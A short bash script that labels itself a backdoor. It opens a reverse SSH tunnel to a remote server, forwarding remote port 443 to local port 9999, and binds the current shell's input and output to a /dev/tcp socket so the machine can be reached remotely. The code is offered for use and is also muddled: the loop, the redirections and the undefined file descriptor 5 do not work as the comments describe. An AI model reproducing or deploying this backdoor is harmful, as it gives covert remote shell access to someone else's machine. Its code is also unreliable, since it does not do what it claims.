#!/bin/bash

# Create a backdoor SSH tunnel to a remote server (Replace with your IP and port)
ssh -f -N -R 443:localhost:9999 user@remote.server.com

# Wait for the tunnel to be established
sleep 5

# Run an infinite loop that checks for incoming connections on port 9999
while true; do
    # Accept a connection and set it as the stdin, stdout, stderr of the current shell session
    exec <&3 >&4 2>&4
done 3<>/dev/tcp/127.0.0.1/9999 4>&1

# If something goes wrong, send a message to the remote server
echo "Error: $?" >&5

# Close the connection to the remote server
exec > /dev/null 2>&1
